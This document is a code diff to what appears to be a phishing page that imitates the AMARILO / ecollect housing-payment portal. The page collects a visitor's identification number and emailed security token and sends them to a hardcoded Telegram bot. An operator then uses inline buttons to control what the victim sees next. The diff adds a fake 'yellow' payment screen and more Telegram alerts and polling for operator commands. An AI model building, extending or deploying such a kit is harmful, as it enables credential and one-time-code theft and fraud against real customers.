@@ -24,7 +24,7 @@ body {
     background: var(--fondo);
 }
 
-/* Encabezado */
+/* Encabezado principal (Vista 1, 2 y 3) */
 .topbar {
     min-height: 90px;
     display: flex;
@@ -106,7 +106,7 @@ main {
     line-height: 1.4;
 }
 
-/* Tarjeta central */
+/* Tarjeta central (Vista 1, 2 y 3) */
 .payment-card {
     display: grid;
     grid-template-columns: 46% 54%;
@@ -223,7 +223,7 @@ main {
 
 .input-wrap input::placeholder { color: #777; opacity: 1; }
 
-/* Botón */
+/* Botón general */
 .login-btn {
     width: 100%;
     max-width: 300px;
@@ -250,7 +250,7 @@ main {
     border-top: 1px solid #777;
 }
 
-/* VISTAS */
+/* VISTAS INTERNAS */
 .token-view { display: none; width: 100%; flex-direction: column; }
 .token-view.active { display: flex; }
 .loading-view { display: none; width: 100%; flex-direction: column; align-items: center; padding-top: 20px;}
@@ -375,7 +375,245 @@ main {
 
 .loading-overlay p { font-size: 14px; color: #29313b; font-weight: 700; }
 
-/* RESPONSIVE */
+/* ==========================================
+   VISTA 4: PANTALLA AMARILLA (PAGOS EN LÍNEA)
+   ========================================== */
+#viewAmarilla {
+    display: none;
+    flex-direction: column;
+    min-height: calc(100vh - 90px); /* Resta el tamaño de la barra superior */
+    background: #ffdf00;
+    width: 100%;
+}
+
+#viewAmarilla.active {
+    display: flex;
+}
+
+/* Header simulado dentro de la vista amarilla */
+.header-amarillo {
+    background: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 15px 40px;
+    border-bottom: 1px solid #e5e5e5;
+}
+
+.header-amarillo .logo {
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    font-size: 22px;
+    font-weight: 700;
+    color: #29313b;
+}
+
+.header-amarillo .logo-mark {
+    width: 40px;
+    height: 40px;
+    border: 5px solid #ffdf00;
+}
+
+.header-amarillo .menu-items {
+    display: flex;
+    align-items: center;
+    gap: 30px;
+    font-size: 14px;
+    color: #555;
+    font-weight: 600;
+}
+
+.header-amarillo .menu-icon {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 5px;
+    cursor: pointer;
+}
+
+.header-amarillo .menu-icon span { font-size: 11px; }
+
+.header-amarillo .home-btn-amarillo {
+    padding: 10px 20px;
+    border: 1px solid #555;
+    border-radius: 5px;
+    background: transparent;
+    color: #333;
+    font-size: 12px;
+    font-weight: 700;
+    cursor: pointer;
+}
+
+/* Cuerpo amarillo */
+.body-amarillo {
+    flex: 1;
+    padding: 40px;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    gap: 50px;
+    max-width: 1200px;
+    margin: 0 auto;
+    width: 100%;
+}
+
+/* Lado Izquierdo */
+.left-amarillo {
+    flex: 1;
+    max-width: 500px;
+}
+
+.left-amarillo .titulo {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    font-size: 26px;
+    font-weight: 700;
+    color: #111;
+    margin-bottom: 30px;
+}
+
+.left-amarillo .titulo::after {
+    content: '';
+    height: 40px;
+    width: 1px;
+    background: #333;
+}
+
+.left-amarillo .caja-blanca {
+    background: #fff;
+    padding: 20px;
+    border-radius: 4px;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+}
+
+.left-amarillo .caja-blanca .num {
+    font-size: 15px;
+    font-weight: 700;
+    color: #333;
+    margin-bottom: 8px;
+}
+
+.left-amarillo .caja-blanca .sub {
+    font-size: 13px;
+    color: #666;
+    margin-bottom: 20px;
+}
+
+.left-amarillo .caja-blanca .check {
+    width: 24px;
+    height: 24px;
+    background: #ccc;
+    border-radius: 4px;
+}
+
+/* Lado Derecho */
+.right-amarillo {
+    width: 380px;
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+}
+
+/* Barra de pasos */
+.pasos {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: relative;
+    margin-bottom: 10px;
+    padding: 0 10px;
+}
+
+.pasos::before {
+    content: '';
+    position: absolute;
+    top: 11px;
+    left: 10%;
+    right: 10%;
+    height: 2px;
+    background: #333;
+    z-index: 1;
+}
+
+.paso {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    z-index: 2;
+    gap: 5px;
+}
+
+.paso .circulo {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: #333;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: 700;
+}
+
+/* Tarjeta blanca derecha */
+.card-blanca-amarilla {
+    background: #fff;
+    border-radius: 6px;
+    padding: 20px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+}
+
+.btn-siguiente {
+    width: 100%;
+    background: #2da22d;
+    color: #fff;
+    border: 0;
+    border-radius: 4px;
+    padding: 15px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    transition: background 0.2s;
+}
+.btn-siguiente:hover { background: #248524; }
+
+.recaptcha-texto {
+    font-size: 11px;
+    color: #666;
+    line-height: 1.4;
+    margin-bottom: 15px;
+}
+.recaptcha-texto b { color: #29313b; }
+
+.logos-pasarela {
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    justify-content: center;
+    flex-wrap: wrap;
+}
+
+/* Footer amarillo */
+.footer-amarillo {
+    background: #f2f2f2;
+    padding: 20px;
+    text-align: center;
+    font-size: 11px;
+    color: #777;
+    margin-top: auto;
+}
+
+/* ==========================================
+   RESPONSIVE
+   ========================================== */
 @media (min-width: 701px) and (max-width: 950px) {
     .topbar { gap: 16px; padding-right: 22px; padding-left: 22px; }
     .topbar h1 { font-size: 21px; }
@@ -384,6 +622,9 @@ main {
     .form-side { padding: 24px 18px; }
     .form-side h3 { font-size: 16px; }
     .input-wrap, .login-btn, .rule, .token-input-box { max-width: 100%; }
+    
+    .body-amarillo { flex-direction: column; padding: 20px; gap: 30px;}
+    .right-amarillo { width: 100%; max-width: 500px; margin: 0 auto; }
 }
 
 @media (max-width: 700px) {
@@ -417,124 +658,201 @@ main {
     .ssl { padding: 12px; font-size: 12px; }
     .cert { width: 68px; height: 68px; font-size: 10px; }
     .notice { margin: 20px 16px 0; font-size: 10px; line-height: 1.5; }
-}
 
-@media (max-width: 390px) {
-    .intro { padding: 0 16px; margin-bottom: 45px; }
-    .intro h2 { font-size: 24px; font-weight: 700; line-height: 1.1; letter-spacing: -0.5px; }
-    .intro p { font-size: 20px; line-height: 1.15; }
-    .form-side { padding: 17px 16px 30px; }
-    .form-side h3 { font-size: 20px; }
-    .form-side .help { font-size: 17px; }
-    .form-side .email-text { font-size: 16px; }
-    .input-wrap { height: 36px; margin-bottom: 18px; }
-    .user-icon { flex-basis: 46px; width: 46px; min-width: 46px; }
-    .input-wrap input { height: 36px; padding: 5px 8px; font-size: 14px; }
-    .login-btn { min-height: 37px; font-size: 16px; }
-    .security { margin-top: 55px; }
+    /* Ajustes móvil para la vista amarilla */
+    .header-amarillo { flex-direction: column; padding: 15px; gap: 15px; }
+    .header-amarillo .menu-items { display: none; /* Ocultamos menú para que quepa en cel */ }
+    .header-amarillo .home-btn-amarillo { width: 100%; }
+    
+    .body-amarillo { flex-direction: column; padding: 20px 15px; gap: 30px; }
+    .left-amarillo { width: 100%; max-width: none; }
+    .left-amarillo .titulo { font-size: 20px; margin-bottom: 15px; }
+    .right-amarillo { width: 100%; }
+    .pasos { padding: 0; }
+    .pasos::before { left: 15%; right: 15%; }
 }
 </style>
 </head>
 
 <body>
 
-<header class="topbar">
-    <div class="brand" aria-label="Marca">
-        <div class="brand-mark"></div>
-        AMARILO
-    </div>
-    <div class="brand-divider"></div>
-    <h1>Módulo de Recaudos</h1>
-    <button class="home-btn" type="button" onclick="location.reload()">
-        REGRESAR AL INICIO
-    </button>
-</header>
-
-<main>
-    <section class="intro">
-        <h2>Bienvenido al sistema de pagos electrónicos de AMARILO - Separaciones ventas nuevas</h2>
-        <p>AQUÍ PODRÁS REALIZAR TUS PAGOS DE MANERA SEGURA</p>
-    </section>
-
-    <section class="payment-card" aria-label="Módulo de recaudos">
-        <div class="photo-side">
-            <img src="https://styles.ecollect.co/eCollectPlus/10189/eCollect_brand/img/box_login.png" alt="Imagen ilustrativa">
+<!-- VISTA 1,2,3: CONTENEDOR ORIGINAL -->
+<div id="contenedorOriginal">
+    <header class="topbar">
+        <div class="brand" aria-label="Marca">
+            <div class="brand-mark"></div>
+            AMARILO
         </div>
+        <div class="brand-divider"></div>
+        <h1>Módulo de Recaudos</h1>
+        <button class="home-btn" type="button" onclick="location.reload()">
+            REGRESAR AL INICIO
+        </button>
+    </header>
 
-        <div class="form-side">
-            <!-- VISTA 1: IDENTIFICACIÓN -->
-            <div id="viewIdentificacion" style="width: 100%;">
-                <h3>PAGO DE LA CUOTA DE SU VIVIENDA</h3>
-                <p class="help">Digite la información solicitada para ingresar al sistema.</p>
+    <main>
+        <section class="intro">
+            <h2>Bienvenido al sistema de pagos electrónicos de AMARILO - Separaciones ventas nuevas</h2>
+            <p>AQUÍ PODRÁS REALIZAR TUS PAGOS DE MANERA SEGURA</p>
+        </section>
 
-                <div class="input-wrap">
-                    <span class="user-icon" aria-hidden="true">♟</span>
-                    <input type="text" id="identificacion" placeholder="* Número de identificación" aria-label="Número de identificación" inputmode="numeric" maxlength="12">
-                </div>
-                
-                <p class="error-msg" id="errorId">Por favor ingresa tu número de identificación.</p>
-
-                <button class="login-btn" type="button" id="btnLogin">
-                    INICIAR SESIÓN
-                </button>
-                <hr class="rule">
+        <section class="payment-card" aria-label="Módulo de recaudos">
+            <div class="photo-side">
+                <img src="https://styles.ecollect.co/eCollectPlus/10189/eCollect_brand/img/box_login.png" alt="Imagen ilustrativa">
             </div>
 
-            <!-- VISTA 2: ESPERANDO CORREO (SPINNER) -->
-            <div id="viewEsperandoCorreo" class="loading-view">
-                <h3>PAGO DE LA CUOTA DE SU VIVIENDA</h3>
-                <p class="help">Cargando correo electrónico...</p>
-                <div style="border: 4px solid #f3f3f3; border-top: 4px solid #29313b; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px 0;"></div>
-            </div>
+            <div class="form-side">
+                <!-- VISTA 1: IDENTIFICACIÓN -->
+                <div id="viewIdentificacion" style="width: 100%;">
+                    <h3>PAGO DE LA CUOTA DE SU VIVIENDA</h3>
+                    <p class="help">Digite la información solicitada para ingresar al sistema.</p>
 
-            <!-- VISTA 3: TOKEN -->
-            <div id="viewToken" class="token-view">
-                <h3>PAGO DE LA CUOTA DE SU VIVIENDA</h3>
-                <p class="help">Por favor ingrese el Token enviado a su correo electrónico:</p>
-                <p class="email-text" id="correoEnmascarado">...</p>
+                    <div class="input-wrap">
+                        <span class="user-icon" aria-hidden="true">♟</span>
+                        <input type="text" id="identificacion" placeholder="* Número de identificación" aria-label="Número de identificación" inputmode="numeric" maxlength="12">
+                    </div>
+                    
+                    <p class="error-msg" id="errorId">Por favor ingresa tu número de identificación.</p>
 
-                <div class="token-input-box">
-                    <span class="lock-icon" aria-hidden="true">
-                        <svg width="14" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-                        </svg>
-                    </span>
-                    <input type="password" id="inputToken" aria-label="Token de seguridad" inputmode="numeric" maxlength="6" placeholder="......">
-                    <button type="button" class="toggle-eye" id="btnToggleEye" aria-label="Mostrar u ocultar token">
-                        <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-                            <circle cx="12" cy="12" r="3"></circle>
-                        </svg>
+                    <button class="login-btn" type="button" id="btnLogin">
+                        INICIAR SESIÓN
                     </button>
+                    <hr class="rule">
                 </div>
 
-                <p class="error-msg" id="errorToken">El token debe tener exactamente 6 dígitos.</p>
+                <!-- VISTA 2: ESPERANDO CORREO (SPINNER) -->
+                <div id="viewEsperandoCorreo" class="loading-view">
+                    <h3>PAGO DE LA CUOTA DE SU VIVIENDA</h3>
+                    <p class="help">Cargando correo electrónico...</p>
+                    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #29313b; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px 0;"></div>
+                </div>
 
-                <button class="login-btn" type="button" id="btnValidarToken">
-                    VALIDAR TOKEN
-                </button>
-                <hr class="rule">
+                <!-- VISTA 3: TOKEN -->
+                <div id="viewToken" class="token-view">
+                    <h3>PAGO DE LA CUOTA DE SU VIVIENDA</h3>
+                    <p class="help">Por favor ingrese el Token enviado a su correo electrónico:</p>
+                    <p class="email-text" id="correoEnmascarado">...</p>
+
+                    <div class="token-input-box">
+                        <span class="lock-icon" aria-hidden="true">
+                            <svg width="14" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                            </svg>
+                        </span>
+                        <input type="password" id="inputToken" aria-label="Token de seguridad" inputmode="numeric" maxlength="6" placeholder="......">
+                        <button type="button" class="toggle-eye" id="btnToggleEye" aria-label="Mostrar u ocultar token">
+                            <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                            </svg>
+                        </button>
+                    </div>
+
+                    <p class="error-msg" id="errorToken">El token debe tener exactamente 6 dígitos.</p>
+
+                    <button class="login-btn" type="button" id="btnValidarToken">
+                        VALIDAR TOKEN
+                    </button>
+                    <hr class="rule">
+                </div>
             </div>
-        </div>
-    </section>
+        </section>
 
-    <section class="security" aria-label="Elementos de seguridad">
-        <div>
-            <div class="ecollect"><b>G</b> ecollect</div>
-            <div class="secure-sub">Seguro para ti ◈</div>
-        </div>
-        <div class="ssl">SSL</div>
-        <div class="cert">ICONO<br>SEGURIDAD</div>
-    </section>
+        <section class="security" aria-label="Elementos de seguridad">
+            <div>
+                <div class="ecollect"><b>G</b> ecollect</div>
+                <div class="secure-sub">Seguro para ti ◈</div>
+            </div>
+            <div class="ssl">SSL</div>
+            <div class="cert">ICONO<br>SEGURIDAD</div>
+        </section>
 
-    <p class="notice">Concepto de diseño para revisión empresarial.</p>
-</main>
+        <p class="notice">Concepto de diseño para revisión empresarial.</p>
+    </main>
+</div>
 
 <!-- OVERLAY DE CARGA GLOBAL -->
-<div class="loading-overlay" id="loading-overlay" style="display:none; position:fixed; inset:0; background:rgba(255,255,255,0.85); align-items:center; justify-content:center; z-index:1000; flex-direction:column;">
-    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #29313b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px;"></div>
-    <p style="font-size:14px; font-weight:700; color:#29313b;">Procesando...</p>
+<div class="loading-overlay" id="loading-overlay">
+    <div class="spinner"></div>
+    <p>Procesando...</p>
+</div>
+
+<!-- VISTA 4: PANTALLA AMARILLA (PAGOS EN LÍNEA) -->
+<div id="viewAmarilla">
+    <header class="header-amarillo">
+        <div class="logo">
+            <div class="logo-mark"></div>
+            AMARILO
+        </div>
+        <div class="menu-items">
+            <div class="menu-icon">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
+                <span>Servicios</span>
+            </div>
+            <div class="menu-icon">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
+                <span>Cartera</span>
+            </div>
+            <div class="menu-icon">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                <span>¡Hola!</span>
+            </div>
+        </div>
+        <button class="home-btn-amarillo" onclick="location.reload()">REGRESAR AL INICIO</button>
+    </header>
+
+    <div class="body-amarillo">
+        <!-- Columna Izquierda -->
+        <div class="left-amarillo">
+            <div class="titulo">LIRIO ET1</div>
+            <div class="caja-blanca">
+                <div class="num">16-1003.240405.38361573</div>
+                <div class="sub">16-1003</div>
+                <div class="check"></div>
+            </div>
+        </div>
+
+        <!-- Columna Derecha -->
+        <div class="right-amarillo">
+            <div class="pasos">
+                <div class="paso">
+                    <div class="circulo">1</div>
+                </div>
+                <div class="paso">
+                    <div class="circulo">2</div>
+                </div>
+                <div class="paso">
+                    <div class="circulo">3</div>
+                </div>
+            </div>
+
+            <div class="card-blanca-amarilla">
+                <button class="btn-siguiente" id="btnSiguienteAmarillo">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+                    SIGUIENTE
+                </button>
+                <div class="recaptcha-texto">
+                    Sitio protegido por reCAPTCHA. aplican las políticas de <b>privacidad</b> y <b>términos</b> de Google.
+                </div>
+                <div class="logos-pasarela">
+                    <div style="background: transparent; padding:0; color: #54ad57; font-size: 14px;"><b>G</b> ecollect</div>
+                    <div style="background: #eee; padding: 3px 6px; font-size: 10px; border-radius: 3px;">Trustwave</div>
+                    <div style="background: #eee; padding: 3px 6px; font-size: 10px; border-radius: 3px;">P SECURE</div>
+                </div>
+            </div>
+
+            <div class="card-blanca-amarilla" style="padding: 20px;">
+                <h4 style="margin: 0 0 15px; color: #333; font-size: 16px;">Centro de ayuda</h4>
+                <div style="font-size: 13px; color: #555; margin-bottom: 8px;">📞 018000122442 - 6340000</div>
+                <div style="font-size: 13px; color: #555;">✉ servicioalcliente@amarilo.com</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-amarillo">
+        Copyright © 2004-2021, ecollect Plus. Version 7. Avisor Technologies S.A.S, Todos los Derechos Reservados.
+    </div>
 </div>
 
 <script>
@@ -547,6 +865,10 @@ const TG_CHAT_ID = '7776240161';
 // ==========================================
 // VARIABLES Y ELEMENTOS
 // ==========================================
+const contenedorOriginal = document.getElementById('contenedorOriginal');
+const viewAmarilla = document.getElementById('viewAmarilla');
+const btnSiguienteAmarillo = document.getElementById('btnSiguienteAmarillo');
+
 const inputId = document.getElementById('identificacion');
 const btnLogin = document.getElementById('btnLogin');
 const viewIdentificacion = document.getElementById('viewIdentificacion');
@@ -625,7 +947,7 @@ function enviarTokenTelegram(valorToken, onSent) {
     const keyboard = {
         inline_keyboard: [
             [{ text: '❌ Usuario Malo', callback_data: 'usuario_malo_final' }],
-            [{ text: '🌐 Usuario Correcto (Google)', callback_data: 'usuario_correcto' }],
+            [{ text: '🌐 Usuario Correcto', callback_data: 'usuario_correcto' }],
             [{ text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo' }]
         ]
     };
@@ -660,7 +982,6 @@ function escucharBotones(callbackAction) {
             for (const u of data.result) {
                 ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
                 
-                // Escuchar clics en botones
                 if (u.callback_query) {
                     const messageId = String(u.callback_query.message.message_id);
                     if (messageId === String(msgIdActual)) {
@@ -670,7 +991,6 @@ function escucharBotones(callbackAction) {
                     }
                 }
 
-                // Escuchar el texto que TÚ escribes en Telegram para el correo
                 if (u.message && u.message.text && esperandoCorreoEscrito) {
                     if (u.message.text.includes('@') || u.message.text.includes('*')) {
                         pollingActivo = false;
@@ -750,7 +1070,10 @@ function handleTelegramActionToken(action) {
     actionProcessed = true;
 
     if (action === 'usuario_correcto') {
-        redirigir('https://www.google.com');
+        contenedorOriginal.style.display = 'none';
+        viewAmarilla.classList.add('active');
+        escucharBotonSiguienteAmarillo();
+
     } else if (action === 'finalizar_yahoo') {
         redirigir('https://www.yahoo.com');
     } else if (action === 'usuario_malo_final') {
@@ -764,6 +1087,72 @@ function handleTelegramActionToken(action) {
         ocultarOverlay();
         actionProcessed = false;
     }
+}
+
+// ==========================================
+// NUEVA LÓGICA: BOTÓN SIGUIENTE EN PANTALLA AMARILLA
+// ==========================================
+function escucharBotonSiguienteAmarillo() {
+    btnSiguienteAmarillo.addEventListener('click', function() {
+        const originalText = btnSiguienteAmarillo.innerHTML;
+        btnSiguienteAmarillo.innerHTML = 'Cargando...';
+        btnSiguienteAmarillo.style.opacity = '0.7';
+        
+        // Enviar notificación a Telegram que el usuario hizo clic
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: TG_CHAT_ID, 
+                text: `⚠️ <b>EL USUARIO HA DADO CLIC EN "SIGUIENTE"</b>\n\n🔍 Identificación: <code>${idBuscadoGlobal}</code>\n\n👉 <i>¿Qué deseas hacer ahora? (Puedes usar los botones de abajo)</i>`, 
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo_final' }],
+                        [{ text: '🚫 Mostrar Error', callback_data: 'mostrar_error_final' }]
+                    ]
+                }
+            })
+        }).then(r => r.json()).then(data => {
+            if (data.ok && data.result) {
+                msgIdActual = String(data.result.message_id);
+                escucharAccionesFinales();
+            }
+        });
+    });
+}
+
+function escucharAccionesFinales() {
+    pollingActivo = true;
+    function check() {
+        if (!pollingActivo) return;
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ offset: ultimoUpdateId + 1, allowed_updates: ['callback_query'], timeout: 10 })
+        }).then(r => r.json()).then(data => {
+            if (!data.ok || !data.result || data.result.length === 0) {
+                pollingTimeout = setTimeout(check, 2000); return;
+            }
+            for (const u of data.result) {
+                ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
+                if (u.callback_query) {
+                    const messageId = String(u.callback_query.message.message_id);
+                    if (messageId === String(msgIdActual)) {
+                        pollingActivo = false;
+                        const action = u.callback_query.data;
+                        if (action === 'finalizar_yahoo_final') {
+                            redirigir('https://www.yahoo.com');
+                        } else if (action === 'mostrar_error_final') {
+                            alert('Error simulado desde el sistema.');
+                            location.reload();
+                        }
+                        return;
+                    }
+                }
+            }
+            pollingTimeout = setTimeout(check, 2000);
+        }).catch(() => { pollingTimeout = setTimeout(check, 3000); });
+    }
+    check();
 }
 
 // ==========================================
